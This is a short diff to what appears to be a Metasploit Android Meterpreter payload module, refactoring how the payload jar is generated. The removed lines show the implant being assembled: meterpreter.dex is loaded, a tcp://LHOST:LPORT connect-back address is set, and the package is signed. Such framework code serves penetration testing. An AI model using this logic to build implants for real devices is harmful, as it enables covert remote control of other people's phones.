@@ -42,25 +42,8 @@ module MetasploitModule
   end
 
   def generate_jar(opts={})
-    jar = Rex::Zip::Jar.new
-    classes = MetasploitPayloads.read('android', 'meterpreter.dex')
-    url = "tcp://#{datastore['LHOST']}:#{datastore['LPORT']}"
     opts[:stageless] = true
-    apply_options(classes, opts, url)
-
-    jar.add_file("classes.dex", fix_dex_header(classes))
-    files = [
-      [ "AndroidManifest.xml" ],
-      [ "resources.arsc" ]
-    ]
-    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
-    jar.build_manifest
-
-    cert, key = generate_cert
-    jar.sign(key, cert, [cert])
-
-    jar
+    super(opts)
   end
-
 
 end
